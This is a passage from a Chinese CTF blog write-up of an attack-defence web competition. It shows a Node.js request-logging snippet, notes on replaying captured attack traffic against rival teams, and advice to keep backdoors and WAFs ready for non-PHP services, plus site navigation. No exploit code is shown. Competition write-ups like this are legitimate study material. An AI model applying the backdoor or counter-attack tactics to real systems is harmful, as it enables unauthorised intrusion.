class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>也是直接拼接.另外一次也是如此.</p>
+<p>手速快,然后就要么没打开服务被checkdown,要么打开了服务被我们打.这样搞几个小时全场还是挺舒服.</p>
+<p>主要原因还是大家似乎都不太熟悉nodejs,也没准备相应的流量记录.</p>
+<p>可惜打了几个小时就下线了.</p>
+<p>附上临时写的流量记录的代码,插到入口文件即可:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;url:&quot;</span>+req.url+req.methed);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;body:&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(req.body)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;header:&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(req.headers);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;\n\n&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>以debug模式开启服务,然后重定向输入到<code>/tmp/log.txt</code></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实际上,整场比赛只有几个特别明显的漏洞是我们自己审计出来的.较为复杂的漏洞均是抓到流量后反打,但就算这样我们web的分数也在前5甚至一度前2.并不是第一次比赛是这种情况,之前的几次也是这样.</p>
+<p>我个人看来,当前AWD环境中,流量审计的作用大于代码审计,漏洞难找易修.特别是如果主办发权限控制较好,找到一个0day也很难维持住权限,大家都是老赛棍,经验丰富.代码审计的作用就更小了,甚至不如一直盯着流量做到及时防护与反打有效.</p>
+<p>还有一点就是之前的文章中也提到过的,要准备好非php环境的后门,waf,流量审计等工具,难度低的比赛还是php为主,但是大佬齐聚的比赛php显然不够玩,java,nodejs,php,python等等语言环境的题目一起上是主流.</p>
+<p>当然如果遇到没见过的情况,快速开发也是可行的.在这次比赛中,发现一个漏洞到写出批量脚本并且修好漏洞的响应时间,大致在十分钟左右,也就是一两轮的时间,要是不熟悉脚本语言,写慢了,就搭不到代码审计大佬的顺风车了.</p>
+<p>贴几张图自嗨一下(划去)</p>
+<p><img src="1.png" alt="1"></p>
+<p><img src="2.png" alt="1"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>M09ic
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://m09ic.top/posts/10013/" title="D3CTF FINAL Writeup(WEB)">https://m09ic.top/posts/10013/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/5871/" rel="prev" title="从一个代码审计例子看ssrf的防护与绕过">
+      <i class="fa fa-chevron-left"></i> 从一个代码审计例子看ssrf的防护与绕过
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/7923/" rel="next" title="AWD MyCheatSheet">
+      AWD MyCheatSheet <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web1"><span class="nav-number">2.</span> <span class="nav-text">web1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB"><span class="nav-number">2.1.</span> <span class="nav-text">任意文件读</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E5%8F%B0getshell"><span class="nav-number">2.2.</span> <span class="nav-text">前台getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.</span> <span class="nav-text">sql注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2"><span class="nav-number">3.</span> <span class="nav-text">web2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8Fsql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C"><span class="nav-number">3.1.</span> <span class="nav-text">后台任意sql语句执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E5%8A%9E%E6%96%B9%E7%95%99%E7%9A%84%E5%90%8E%E9%97%A8"><span class="nav-number">3.2.</span> <span class="nav-text">主办方留的后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5"><span class="nav-number">3.3.</span> <span class="nav-text">前台sql注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3"><span class="nav-number">4.</span> <span class="nav-text">web3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">M09ic</p>
+  <div class="site-description" itemprop="description">网络安全,编程学习记录的破地方</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/M09Ic" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;M09Ic" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:m09ic@foxmail.com" title="E-Mail → mailto:m09ic@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://yml-sec.top/" title="https:&#x2F;&#x2F;yml-sec.top" rel="noopener" target="_blank">夜莫离</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://nightrainy.github.io/" title="https:&#x2F;&#x2F;nightrainy.github.io" rel="noopener" target="_blank">知世</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.360bug.net/" title="http:&#x2F;&#x2F;www.360bug.net" rel="noopener" target="_blank">孙德胜</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-paper-plane"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M09ic</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'yP9ifyVVnh7znqRQVWNWn0V6-gzGzoHsz',
+      appKey     : 'k84kdIIIEt3b7F17XqEoBT22',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
